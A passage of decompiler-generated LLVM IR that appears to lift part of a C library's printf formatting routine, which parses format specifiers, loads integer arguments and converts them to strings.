  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_80527ea, i32* @esi, align 4
  store i1 %v13_80527ea, i1* %sf.global-to-local, align 1
  %tmp66 = icmp slt i32 %v2_80527ea, 1
  br i1 %tmp66, label %dec_label_pc_805280a, label %dec_label_pc_80527f8

dec_label_pc_80527f8:                             ; preds = %dec_label_pc_80527ee
  %v0_80527f8 = load i32, i32* @ebp, align 4
  %v1_80527f8 = load i32, i32* @esp, align 4
  %v2_80527f8 = add i32 %v1_80527f8, -4
  %v3_80527f8 = inttoptr i32 %v2_80527f8 to i32*
  store i32 %v0_80527f8, i32* %v3_80527f8, align 4
  %v1_80527f9 = add i32 %v1_80527f8, 368
  %v2_80527f9 = inttoptr i32 %v1_80527f9 to i32*
  %v3_80527f9 = load i32, i32* %v2_80527f9, align 4
  %v5_80527f9 = add i32 %v1_80527f8, -8
  %v6_80527f9 = inttoptr i32 %v5_80527f9 to i32*
  store i32 %v3_80527f9, i32* %v6_80527f9, align 4
  %v0_8052800 = load i32, i32* @esi, align 4
  %v2_8052800 = add i32 %v1_80527f8, -12
  %v3_8052800 = inttoptr i32 %v2_8052800 to i32*
  store i32 %v0_8052800, i32* %v3_8052800, align 4
  %v0_8052801 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052801 = add i32 %v1_80527f8, -16
  %v3_8052801 = inttoptr i32 %v2_8052801 to i32*
  store i32 %v0_8052801, i32* %v3_8052801, align 4
  %v0_8052802 = load i32, i32* %stack_var_-364, align 4
  %v4_8052802 = call i32 @__stdio_fwrite(i32 %v0_8052802, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052802, i32* %eax.global-to-local, align 4
  %v0_8052807 = load i32, i32* @esp, align 4
  %v1_8052807 = add i32 %v0_8052807, 16
  %v7_8052807 = icmp slt i32 %v1_8052807, 0
  store i1 %v7_8052807, i1* %sf.global-to-local, align 1
  %v1_805280a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805280a

dec_label_pc_805280a:                             ; preds = %dec_label_pc_80527ee, %dec_label_pc_80527f8
  %v3_8052812 = phi i32 [ %v2_80527ea, %dec_label_pc_80527ee ], [ %v1_805280a.pre, %dec_label_pc_80527f8 ]
  %v0_805280a = phi i32 [ 0, %dec_label_pc_80527ee ], [ %v4_8052802, %dec_label_pc_80527f8 ]
  %v2_805280a = sub i32 %v0_805280a, %v3_8052812
  %v12_805280a = icmp eq i32 %v2_805280a, 0
  %v13_805280a = icmp slt i32 %v2_805280a, 0
  store i1 %v13_805280a, i1* %sf.global-to-local, align 1
  %v1_805280c = icmp eq i1 %v12_805280a, false
  %v0_8052d03.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_805280c, label %dec_label_pc_8052d03, label %dec_label_pc_8052812

dec_label_pc_8052812:                             ; preds = %dec_label_pc_805280a
  %v1_8052812 = inttoptr i32 %v0_8052d03.pre.pre to i32*
  %v2_8052812 = load i32, i32* %v1_8052812, align 4
  %v4_8052812 = add i32 %v2_8052812, %v3_8052812
  %v15_8052812 = icmp slt i32 %v4_8052812, 0
  store i1 %v15_8052812, i1* %sf.global-to-local, align 1
  store i32 %v4_8052812, i32* %v1_8052812, align 4
  %v0_8052815.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052815

dec_label_pc_8052815:                             ; preds = %dec_label_pc_80527ea, %dec_label_pc_8052812
  %v0_8052cfb = phi i32 [ %v0_80527ee, %dec_label_pc_80527ea ], [ %v0_8052815.pre, %dec_label_pc_8052812 ]
  %v1_8052815 = inttoptr i32 %v0_8052cfb to i8*
  %v2_8052815 = load i8, i8* %v1_8052815, align 1
  %v3_8052815 = icmp eq i8 %v2_8052815, 0
  %v4_8052815 = icmp slt i8 %v2_8052815, 0
  store i1 %v4_8052815, i1* %sf.global-to-local, align 1
  br i1 %v3_8052815, label %dec_label_pc_8052d0a, label %dec_label_pc_805281e

dec_label_pc_805281e:                             ; preds = %dec_label_pc_8052815
  %v1_805281e = add i32 %v0_8052cfb, 1
  %v2_805281e = inttoptr i32 %v1_805281e to i8*
  %v3_805281e = load i8, i8* %v2_805281e, align 1
  %v4_805281e = add i8 %v3_805281e, -37
  %v12_805281e = icmp eq i8 %v4_805281e, 0
  %v13_805281e = icmp slt i8 %v4_805281e, 0
  store i1 %v13_805281e, i1* %sf.global-to-local, align 1
  store i32 %v1_805281e, i32* %edx.global-to-local, align 4
  br i1 %v12_805281e, label %dec_label_pc_8052cfb, label %dec_label_pc_805282b

dec_label_pc_805282b:                             ; preds = %dec_label_pc_805281e
  %v1_805282b = load i32, i32* @esp, align 4
  %v2_805282b = add i32 %v1_805282b, 16
  %v3_805282b = inttoptr i32 %v2_805282b to i32*
  store i32 %v1_805281e, i32* %v3_805282b, align 4
  %v0_805282f = load i32, i32* @esp, align 4
  %v1_805282f = add i32 %v0_805282f, 340
  %v2_805282f = inttoptr i32 %v1_805282f to i32*
  store i32 0, i32* %v2_805282f, align 4
  %v0_805283a = load i32, i32* @esp, align 4
  %v1_805283a = add i32 %v0_805283a, -12
  %v10_805283a = icmp slt i32 %v1_805283a, 0
  store i1 %v10_805283a, i1* %sf.global-to-local, align 1
  %v1_805283d = add i32 %v0_805283a, 16
  store i32 %v1_805283d, i32* @ebx, align 4
  %v2_8052841 = add i32 %v0_805283a, -16
  %v3_8052841 = inttoptr i32 %v2_8052841 to i32*
  store i32 %v1_805283d, i32* %v3_8052841, align 4
  %v0_8052842 = load i32, i32* %stack_var_-364, align 4
  %v1_8052842 = inttoptr i32 %v0_8052842 to i32*
  %v2_8052842 = call i32 @_ppfs_parsespec(i32* %v1_8052842)
  store i32 %v2_8052842, i32* %eax.global-to-local, align 4
  %v0_8052847 = load i32, i32* @ebx, align 4
  %v1_8052847 = load i32, i32* @esp, align 4
  %v2_8052847 = inttoptr i32 %v1_8052847 to i32*
  store i32 %v0_8052847, i32* %v2_8052847, align 4
  %v0_805284a = load i32, i32* %stack_var_-364, align 4
  %v1_805284a = call i32 @_ppfs_setargs(i32 %v0_805284a)
  store i32 %v1_805284a, i32* %eax.global-to-local, align 4
  %v0_805284f = load i32, i32* @esp, align 4
  %v1_805284f = add i32 %v0_805284f, 70
  %v2_805284f = inttoptr i32 %v1_805284f to i8*
  %v3_805284f = load i8, i8* %v2_805284f, align 1
  %v4_805284f = zext i8 %v3_805284f to i32
  store i32 %v4_805284f, i32* @edi, align 4
  %v1_8052854 = add i32 %v0_805284f, 16
  %v1_8052857 = add i32 %v0_805284f, 56
  %v2_8052857 = inttoptr i32 %v1_8052857 to i32*
  %v3_8052857 = load i32, i32* %v2_8052857, align 4
  %v5_8052857 = icmp slt i32 %v3_8052857, 0
  store i1 %v5_8052857, i1* %sf.global-to-local, align 1
  %v1_805285c = add i32 %v0_805284f, 112
  store i32 %v1_805285c, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_8052857, 1
  br i1 %tmp67, label %dec_label_pc_8052869, label %dec_label_pc_8052862

dec_label_pc_8052862:                             ; preds = %dec_label_pc_805282b
  %v2_8052862 = zext i8 %v3_805284f to i32
  %v3_8052862 = mul nuw nsw i32 %v2_8052862, 12
  store i32 %v3_8052862, i32* %eax.global-to-local, align 4
  %v2_8052865 = add i32 %v0_805284f, 100
  %v3_8052865 = add i32 %v2_8052865, %v3_8052862
  store i32 %v3_8052865, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052869

dec_label_pc_8052869:                             ; preds = %dec_label_pc_805282b, %dec_label_pc_8052862
  %v0_805287128 = phi i32 [ %v1_805285c, %dec_label_pc_805282b ], [ %v3_8052865, %dec_label_pc_8052862 ]
  %v1_8052869 = add i32 %v0_805284f, 60
  %v2_8052869 = inttoptr i32 %v1_8052869 to i32*
  %v3_8052869 = load i32, i32* %v2_8052869, align 4
  store i32 %v3_8052869, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805287c73 = sub i32 0, %v3_8052869
  %v10_805287c76 = and i32 %v3_8052869, %v2_805287c73
  %v11_805287c77 = icmp slt i32 %v10_805287c76, 0
  %v13_805287c78 = icmp slt i32 %v2_805287c73, 0
  %v2_805287e79 = icmp eq i1 %v13_805287c78, %v11_805287c77
  br i1 %v2_805287e79, label %dec_label_pc_8052880, label %dec_label_pc_8052871

dec_label_pc_8052871:                             ; preds = %dec_label_pc_8052869, %dec_label_pc_8052871
  %v0_805288083 = phi i32 [ %v0_8052880, %dec_label_pc_8052871 ], [ %v1_8052854, %dec_label_pc_8052869 ]
  %v2_805287182 = phi i32 [ %v1_805287b, %dec_label_pc_8052871 ], [ 0, %dec_label_pc_8052869 ]
  %v0_805287181 = phi i32 [ %v1_8052878, %dec_label_pc_8052871 ], [ %v0_805287128, %dec_label_pc_8052869 ]
  %v3_8052871 = mul i32 %v2_805287182, 4
  %v4_8052871 = add i32 %v3_8052871, 344
  %v5_8052871 = add i32 %v4_8052871, %v0_805288083
  %v6_8052871 = inttoptr i32 %v5_8052871 to i32*
  store i32 %v0_805287181, i32* %v6_8052871, align 4
  %v0_8052878 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052878 = add i32 %v0_8052878, 12
  store i32 %v1_8052878, i32* %edx.global-to-local, align 4
  %v0_805287b = load i32, i32* %eax.global-to-local, align 4
  %v1_805287b = add i32 %v0_805287b, 1
  %v1_805287c.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_805287b, i32* %eax.global-to-local, align 4
  %v2_805287c = sub i32 %v1_805287b, %v1_805287c.pre
  %v8_805287c = xor i32 %v1_805287b, %v1_805287c.pre
  %v9_805287c = xor i32 %v2_805287c, %v1_805287b
  %v10_805287c = and i32 %v9_805287c, %v8_805287c
  %v11_805287c = icmp slt i32 %v10_805287c, 0
  %v13_805287c = icmp slt i32 %v2_805287c, 0
  %v2_805287e = icmp eq i1 %v13_805287c, %v11_805287c
  %v0_8052880 = load i32, i32* @esp, align 4
  br i1 %v2_805287e, label %dec_label_pc_8052880, label %dec_label_pc_8052871

dec_label_pc_8052880:                             ; preds = %dec_label_pc_8052871, %dec_label_pc_8052869
  %v0_8052880.lcssa = phi i32 [ %v1_8052854, %dec_label_pc_8052869 ], [ %v0_8052880, %dec_label_pc_8052871 ]
  %v1_8052880 = add i32 %v0_8052880.lcssa, 48
  %v2_8052880 = inttoptr i32 %v1_8052880 to i32*
  %v3_8052880 = load i32, i32* %v2_8052880, align 4
  store i32 %v3_8052880, i32* %ecx.global-to-local, align 4
  %v1_8052884 = icmp eq i32 %v3_8052880, 0
  %v2_8052884 = icmp slt i32 %v3_8052880, 0
  store i1 %v2_8052884, i1* %sf.global-to-local, align 1
  %v1_8052886 = icmp eq i1 %v1_8052884, false
  br i1 %v1_8052886, label %dec_label_pc_80528ae, label %dec_label_pc_8052888

dec_label_pc_8052888:                             ; preds = %dec_label_pc_8052880
  %v1_8052888 = inttoptr i32 %v0_8052880.lcssa to i32*
  %v2_8052888 = load i32, i32* %v1_8052888, align 4
  store i32 %v2_8052888, i32* %eax.global-to-local, align 4
  %v1_805288b = ashr i32 %v2_8052888, 31
  store i32 %v1_805288b, i32* %edx.global-to-local, align 4
  %v2_805288c = add i32 %v0_8052880.lcssa, -4
  %v3_805288c = inttoptr i32 %v2_805288c to i32*
  store i32 %v1_805288b, i32* %v3_805288c, align 4
  %v0_805288d = load i32, i32* %eax.global-to-local, align 4
  %v2_805288d = add i32 %v0_8052880.lcssa, -8
  %v3_805288d = inttoptr i32 %v2_805288d to i32*
  store i32 %v0_805288d, i32* %v3_805288d, align 4
  %v1_805288e = add i32 %v0_8052880.lcssa, 32
  %v2_805288e = inttoptr i32 %v1_805288e to i32*
  %v3_805288e = load i32, i32* %v2_805288e, align 4
  %v1_8052892 = and i32 %v3_805288e, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8052892, i32* %eax.global-to-local, align 4
  %v2_8052897 = add i32 %v0_8052880.lcssa, -12
  %v3_8052897 = inttoptr i32 %v2_8052897 to i32*
  store i32 %v1_8052892, i32* %v3_8052897, align 4
  %v1_8052898 = add i32 %v0_8052880.lcssa, 344
  %v2_8052898 = inttoptr i32 %v1_8052898 to i32*
  %v3_8052898 = load i32, i32* %v2_8052898, align 4
  store i32 %v3_8052898, i32* %eax.global-to-local, align 4
  %v1_805289f = inttoptr i32 %v3_8052898 to i32*
  %v2_805289f = load i32, i32* %v1_805289f, align 4
  %v4_805289f = add i32 %v0_8052880.lcssa, -16
  %v5_805289f = inttoptr i32 %v4_805289f to i32*
  store i32 %v2_805289f, i32* %v5_805289f, align 4
  %v0_80528a1 = call i32 @_store_inttype()
  store i32 %v0_80528a1, i32* %eax.global-to-local, align 4
  %v0_80528a6 = load i32, i32* @esp, align 4
  %v1_80528a6 = add i32 %v0_80528a6, 16
  %v7_80528a6 = icmp slt i32 %v1_80528a6, 0
  store i1 %v7_80528a6, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052cf0

dec_label_pc_80528ae:                             ; preds = %dec_label_pc_8052880
  %v1_80528ae = add i32 %v3_8052880, -7
  %v5_80528ae = icmp ult i32 %v3_8052880, 7
  %v9_80528ae = icmp eq i32 %v1_80528ae, 0
  %v10_80528ae = icmp slt i32 %v1_80528ae, 0
  store i1 %v10_80528ae, i1* %sf.global-to-local, align 1
  %v2_80528b1 = or i1 %v5_80528ae, %v9_80528ae
  br i1 %v2_80528b1, label %dec_label_pc_80528b7, label %dec_label_pc_8052a1b

dec_label_pc_80528b7:                             ; preds = %dec_label_pc_80528ae
  %v1_80528b7 = add i32 %v3_8052880, 134594832
  %v2_80528b7 = inttoptr i32 %v1_80528b7 to i8*
  %v3_80528b7 = load i8, i8* %v2_80528b7, align 1
  %v4_80528b7 = sext i8 %v3_80528b7 to i32
  store i32 %v4_80528b7, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_80528c3 = icmp eq i8 %v3_80528b7, 10
  %v10_80528c3 = icmp slt i8 %v3_80528b7, 10
  store i1 %v10_80528c3, i1* %sf.global-to-local, align 1
  %v1_80528c6 = icmp eq i1 %v9_80528c3, false
  br i1 %v1_80528c6, label %dec_label_pc_80528e6, label %dec_label_pc_80528c8

dec_label_pc_80528c8:                             ; preds = %dec_label_pc_80528b7
  %v1_80528c8 = add i32 %v0_8052880.lcssa, 32
  %v2_80528c8 = inttoptr i32 %v1_80528c8 to i32*
  %v3_80528c8 = load i32, i32* %v2_80528c8, align 4
  store i32 %v3_80528c8, i32* %eax.global-to-local, align 4
  %v1_80528ce = udiv i32 %v3_80528c8, 32
  %tmp68 = urem i32 %v1_80528ce, 2
  %tmp69 = sub nsw i32 45, %tmp68
  %v2_80528de = or i32 %tmp69, 128
  store i32 %v2_80528de, i32* %edx.global-to-local, align 4
  %v2_80528e1 = and i32 %v3_80528c8, 64
  %v3_80528e1 = icmp eq i32 %v2_80528e1, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_80528e3 = icmp eq i1 %v3_80528e1, false
  %v4_80528e3 = select i1 %v1_80528e3, i32 %v2_80528de, i32 %tmp69
  store i32 %v4_80528e3, i32* @ebx, align 4
  br label %dec_label_pc_80528e6

dec_label_pc_80528e6:                             ; preds = %dec_label_pc_80528b7, %dec_label_pc_80528c8
  %v1_80528e6 = add i32 %v3_8052880, -5
  %v5_80528e6 = icmp ult i32 %v3_8052880, 5
  %v9_80528e6 = icmp eq i32 %v1_80528e6, 0
  %v10_80528e6 = icmp slt i32 %v1_80528e6, 0
  store i1 %v10_80528e6, i1* %sf.global-to-local, align 1
  %v2_80528e9 = or i1 %v5_80528e6, %v9_80528e6
  br i1 %v2_80528e9, label %dec_label_pc_80528eb, label %dec_label_pc_8052903

dec_label_pc_80528eb:                             ; preds = %dec_label_pc_80528e6
  %v1_80528eb = add i32 %v3_8052880, -3
  %v9_80528eb = icmp eq i32 %v1_80528eb, 0
  %v10_80528eb = icmp slt i32 %v1_80528eb, 0
  store i1 %v10_80528eb, i1* %sf.global-to-local, align 1
  %v1_80528ee = icmp eq i1 %v9_80528eb, false
  br i1 %v1_80528ee, label %dec_label_pc_80528f7, label %dec_label_pc_80528f0

dec_label_pc_80528f0:                             ; preds = %dec_label_pc_80528eb
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8052905

dec_label_pc_80528f7:                             ; preds = %dec_label_pc_80528eb
  %v1_80528f7 = add i32 %v3_8052880, -1
  %v9_80528f7 = icmp eq i32 %v1_80528f7, 0
  %v10_80528f7 = icmp slt i32 %v1_80528f7, 0
  store i1 %v10_80528f7, i1* %sf.global-to-local, align 1
  br i1 %v9_80528f7, label %dec_label_pc_805290a, label %dec_label_pc_8052905

dec_label_pc_8052903:                             ; preds = %dec_label_pc_80528e6
  %v1_8052903 = sub nsw i32 0, %v4_80528b7
  %v7_8052903 = icmp sgt i8 %v3_80528b7, 0
  store i1 %v7_8052903, i1* %sf.global-to-local, align 1
  store i32 %v1_8052903, i32* @esi, align 4
  br label %dec_label_pc_8052905

dec_label_pc_8052905:                             ; preds = %dec_label_pc_80528f7, %dec_label_pc_80528f0, %dec_label_pc_8052903
  br label %dec_label_pc_805290a

dec_label_pc_805290a:                             ; preds = %dec_label_pc_80528f7, %dec_label_pc_8052905
  %storemerge = phi i32 [ 11, %dec_label_pc_8052905 ], [ 6, %dec_label_pc_80528f7 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_805290a = add i32 %v0_8052880.lcssa, 20
  %v2_805290a = inttoptr i32 %v1_805290a to i32*
  %v3_805290a = load i32, i32* %v2_805290a, align 4
  %v5_805290a = icmp slt i32 %v3_805290a, 0
  store i1 %v5_805290a, i1* %sf.global-to-local, align 1
  %v1_805290f = add i32 %v0_8052880.lcssa, 7
  %v2_805290f = inttoptr i32 %v1_805290f to i8*
  store i8 32, i8* %v2_805290f, align 1
  %v0_8052914 = load i1, i1* %sf.global-to-local, align 1
  %v1_8052914 = icmp eq i1 %v0_8052914, false
  br i1 %v1_8052914, label %dec_label_pc_805291e, label %dec_label_pc_8052916

dec_label_pc_8052916:                             ; preds = %dec_label_pc_805290a
  %v0_8052916 = load i32, i32* @esp, align 4
  %v1_8052916 = add i32 %v0_8052916, 36
  %v2_8052916 = inttoptr i32 %v1_8052916 to i8*
  %v3_8052916 = load i8, i8* %v2_8052916, align 1
  %v4_8052916 = zext i8 %v3_8052916 to i32
  %v5_8052916 = load i32, i32* %edx.global-to-local, align 4
  %v6_8052916 = and i32 %v5_8052916, -256
  %v7_8052916 = or i32 %v6_8052916, %v4_8052916
  store i32 %v7_8052916, i32* %edx.global-to-local, align 4
  %v3_805291a = add i32 %v0_8052916, 7
  %v4_805291a = inttoptr i32 %v3_805291a to i8*
  store i8 %v3_8052916, i8* %v4_805291a, align 1
  br label %dec_label_pc_805291e

dec_label_pc_805291e:                             ; preds = %dec_label_pc_805290a, %dec_label_pc_8052916
  %v1_805291e = add i32 %v3_8052880, -1
  %v8_805291e = icmp eq i32 %v1_805291e, 0
  %v9_805291e = icmp slt i32 %v1_805291e, 0
  store i1 %v9_805291e, i1* %sf.global-to-local, align 1
  store i32 %v1_805291e, i32* %ecx.global-to-local, align 4
  %v0_805291f = load i32, i32* @esp, align 4
  %v1_805291f = add i32 %v0_805291f, 344
  %v2_805291f = inttoptr i32 %v1_805291f to i32*
  %v3_805291f = load i32, i32* %v2_805291f, align 4
  store i32 %v3_805291f, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_8052937.pre = load i32, i32* @edi, align 4
  br i1 %v8_805291e, label %dec_label_pc_8052937, label %dec_label_pc_805292d

dec_label_pc_805292d:                             ; preds = %dec_label_pc_805291e
  %v2_805292d = mul i32 %v0_8052937.pre, 4
  %v3_805292d = add i32 %v0_805291f, 52
  %v4_805292d = add i32 %v3_805292d, %v2_805292d
  %v5_805292d = inttoptr i32 %v4_805292d to i32*
  %v6_805292d = load i32, i32* %v5_805292d, align 4
  %v1_8052931 = and i32 %v6_805292d, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8052931, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052937

dec_label_pc_8052937:                             ; preds = %dec_label_pc_805291e, %dec_label_pc_805292d
  %v2_8052937 = add i32 %v0_805291f, -4
  %v3_8052937 = inttoptr i32 %v2_8052937 to i32*
  store i32 %v0_8052937.pre, i32* %v3_8052937, align 4
  %v0_8052938 = load i32, i32* @esi, align 4
  %v2_8052938 = add i32 %v0_805291f, -8
  %v3_8052938 = inttoptr i32 %v2_8052938 to i32*
  store i32 %v0_8052938, i32* %v3_8052938, align 4
  %v0_8052939 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052939 = add i32 %v0_805291f, -12
  %v3_8052939 = inttoptr i32 %v2_8052939 to i32*
  store i32 %v0_8052939, i32* %v3_8052939, align 4
  %v0_805293a = load i32, i32* %edx.global-to-local, align 4
  %v2_805293a = add i32 %v0_805291f, -16
  %v3_805293a = inttoptr i32 %v2_805293a to i32*
  store i32 %v0_805293a, i32* %v3_805293a, align 4
  %v0_805293b = call i32 @_load_inttype()
  %v0_8052940 = load i32, i32* @ebx, align 4
  %v1_8052940 = load i32, i32* @esp, align 4
  %v2_8052940 = inttoptr i32 %v1_8052940 to i32*
  store i32 %v0_8052940, i32* %v2_8052940, align 4
  %v0_8052943 = load i32, i32* @esi, align 4
  %v1_8052943 = load i32, i32* @esp, align 4
  %v2_8052943 = add i32 %v1_8052943, -4
  %v3_8052943 = inttoptr i32 %v2_8052943 to i32*
  store i32 %v0_8052943, i32* %v3_8052943, align 4
  %v0_8052944 = load i32, i32* @edx, align 4
  %v2_8052944 = add i32 %v1_8052943, -8
  %v3_8052944 = inttoptr i32 %v2_8052944 to i32*
  store i32 %v0_8052944, i32* %v3_8052944, align 4
  %v2_8052945 = add i32 %v1_8052943, -12
  %v3_8052945 = inttoptr i32 %v2_8052945 to i32*
  store i32 %v0_805293b, i32* %v3_8052945, align 4
  %v1_8052946 = add i32 %v1_8052943, 347
  store i32 %v1_8052946, i32* %eax.global-to-local, align 4
  %v2_805294d = add i32 %v1_8052943, -16
  %v3_805294d = inttoptr i32 %v2_805294d to i32*
  store i32 %v1_8052946, i32* %v3_805294d, align 4
  %v0_805294e = load i32, i32* %stack_var_-364, align 4
  %v5_805294e = inttoptr i32 %v0_805294e to i8*
  %v6_805294e = call i32 @_uintmaxtostr(i8* %v5_805294e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805294e, i32* %eax.global-to-local, align 4
  %v0_8052953 = load i32, i32* @esp, align 4
  %v1_8052953 = add i32 %v0_8052953, 32
  %v1_8052956 = add i32 %v0_8052953, 80
  %v2_8052956 = inttoptr i32 %v1_8052956 to i32*
  %v3_8052956 = load i32, i32* %v2_8052956, align 4
  %v4_8052956 = add i32 %v3_8052956, -5
  %v8_8052956 = icmp ult i32 %v3_8052956, 5
  %v12_8052956 = icmp eq i32 %v4_8052956, 0
  %v13_8052956 = icmp slt i32 %v4_8052956, 0
  store i1 %v13_8052956, i1* %sf.global-to-local, align 1
  store i32 %v6_805294e, i32* @edi, align 4
  %v2_805295d = or i1 %v8_8052956, %v12_8052956
  br i1 %v2_805295d, label %dec_label_pc_8052987, label %dec_label_pc_805295f

dec_label_pc_805295f:                             ; preds = %dec_label_pc_8052937
  %v7_805294e = inttoptr i32 %v6_805294e to i8*
  %v3_805295f = load i8, i8* %v7_805294e, align 1
  %v4_805295f = add i8 %v3_805295f, -45
  %v12_805295f = icmp eq i8 %v4_805295f, 0
  %v13_805295f = icmp slt i8 %v4_805295f, 0
  store i1 %v13_805295f, i1* %sf.global-to-local, align 1
  %v1_8052962 = icmp eq i1 %v12_805295f, false
  %v1_8052971 = add i32 %v0_8052953, 64
  %v2_8052971 = inttoptr i32 %v1_8052971 to i32*
  %v3_8052971 = load i32, i32* %v2_8052971, align 4
  br i1 %v1_8052962, label %dec_label_pc_8052971, label %dec_label_pc_8052964

dec_label_pc_8052964:                             ; preds = %dec_label_pc_805295f
  %v4_8052964 = or i32 %v3_8052971, 2
  store i32 %v4_8052964, i32* %v2_8052971, align 4
  %v0_8052969 = load i32, i32* @edi, align 4
  %v1_8052969 = add i32 %v0_8052969, 1
  %v9_8052969 = icmp slt i32 %v1_8052969, 0
  store i1 %v9_8052969, i1* %sf.global-to-local, align 1
  store i32 %v1_8052969, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8052987.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052987

dec_label_pc_8052971:                             ; preds = %dec_label_pc_805295f
  store i32 %v3_8052971, i32* %eax.global-to-local, align 4
  %v2_8052975 = and i32 %v3_8052971, 2
  %v3_8052975 = icmp eq i32 %v2_8052975, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_8052975, label %dec_label_pc_805297d, label %dec_label_pc_8052979

dec_label_pc_8052979:                             ; preds = %dec_label_pc_8052971
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8052987

dec_label_pc_805297d:                             ; preds = %dec_label_pc_8052971
  %v2_805297d = urem i32 %v3_8052971, 2
  %v3_805297d = icmp eq i32 %v2_805297d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_8052984 = icmp eq i1 %v3_805297d, false
  %v2_8052984 = load i32, i32* @ebp, align 4
  %v4_8052984 = select i1 %v1_8052984, i32 4, i32 %v2_8052984
  store i32 %v4_8052984, i32* @ebp, align 4
  br label %dec_label_pc_8052987

dec_label_pc_8052987:                             ; preds = %dec_label_pc_8052937, %dec_label_pc_8052979, %dec_label_pc_8052964, %dec_label_pc_805297d
  %v0_80529d9 = phi i32 [ %v6_805294e, %dec_label_pc_8052937 ], [ %v6_805294e, %dec_label_pc_8052979 ], [ %v1_8052969, %dec_label_pc_8052964 ], [ %v6_805294e, %dec_label_pc_805297d ]
  %v0_80529e9 = phi i32 [ %v1_8052953, %dec_label_pc_8052937 ], [ %v1_8052953, %dec_label_pc_8052979 ], [ %v0_8052987.pre, %dec_label_pc_8052964 ], [ %v1_8052953, %dec_label_pc_805297d ]
  %v1_8052987 = add i32 %v0_80529e9, 20
  %v2_8052987 = inttoptr i32 %v1_8052987 to i32*
  %v3_8052987 = load i32, i32* %v2_8052987, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_805298b = sub i32 204, %v0_80529d9
  %v2_8052997 = add i32 %v1_805298b, %v0_80529e9
  %v1_8052999 = add i32 %v2_8052997, 127
  store i32 %v1_8052999, i32* @esi, align 4
  %v2_805299c = icmp slt i32 %v3_8052987, 0
  store i1 %v2_805299c, i1* %sf.global-to-local, align 1
  %v3_805299e = select i1 %v2_805299c, i32 1, i32 %v3_8052987
  store i32 %v3_805299e, i32* %ecx.global-to-local, align 4
  %v1_80529a1 = add i32 %v0_80529e9, 32
  %v2_80529a1 = inttoptr i32 %v1_80529a1 to i8*
  %v3_80529a1 = load i8, i8* %v2_80529a1, align 1
  %v4_80529a1 = and i8 %v3_80529a1, 16
  %v5_80529a1 = icmp eq i8 %v4_80529a1, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_80529a1, label %dec_label_pc_80529d9, label %dec_label_pc_80529a8

dec_label_pc_80529a8:                             ; preds = %dec_label_pc_8052987
  %v1_80529a8 = add i32 %v0_80529e9, 48
  %v2_80529a8 = inttoptr i32 %v1_80529a8 to i32*
  %v3_80529a8 = load i32, i32* %v2_80529a8, align 4
  store i32 %v3_80529a8, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp70 = icmp ult i32 %v3_80529a8, 3
  %v3_80529b1 = load i32, i32* @ebp, align 4
  %v5_80529b1 = select i1 %tmp70, i32 6, i32 %v3_80529b1
  store i32 %v5_80529b1, i32* @ebp, align 4
  %v1_80529b4 = add i32 %v3_80529a8, -3
  %v9_80529b4 = icmp eq i32 %v1_80529b4, 0
  %v10_80529b4 = icmp slt i32 %v1_80529b4, 0
  store i1 %v10_80529b4, i1* %sf.global-to-local, align 1
  %v1_80529b7 = icmp eq i1 %v9_80529b4, false
  br i1 %v1_80529b7, label %dec_label_pc_80529c0, label %dec_label_pc_80529b9

dec_label_pc_80529b9:                             ; preds = %dec_label_pc_80529a8
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_80529d9

dec_label_pc_80529c0:                             ; preds = %dec_label_pc_80529a8
  %v1_80529c0 = add i32 %v3_80529a8, -4
  %v9_80529c0 = icmp eq i32 %v1_80529c0, 0
  %v10_80529c0 = icmp slt i32 %v1_80529c0, 0
  store i1 %v10_80529c0, i1* %sf.global-to-local, align 1
  %v1_80529c3 = icmp eq i1 %v9_80529c0, false
  br i1 %v1_80529c3, label %dec_label_pc_80529d9, label %dec_label_pc_80529c5

dec_label_pc_80529c5:                             ; preds = %dec_label_pc_80529c0
  %v2_80529c5 = sub i32 %v3_805299e, %v1_8052999
  %v7_80529c5 = icmp ult i32 %v3_805299e, %v1_8052999
  %v12_80529c5 = icmp eq i32 %v2_80529c5, 0
  %v13_80529c5 = icmp slt i32 %v2_80529c5, 0
  store i1 %v13_80529c5, i1* %sf.global-to-local, align 1
  %v2_80529c7 = or i1 %v7_80529c5, %v12_80529c5
  br i1 %v2_80529c7, label %dec_label_pc_80529c9, label %dec_label_pc_80529d9

dec_label_pc_80529c9:                             ; preds = %dec_label_pc_80529c5
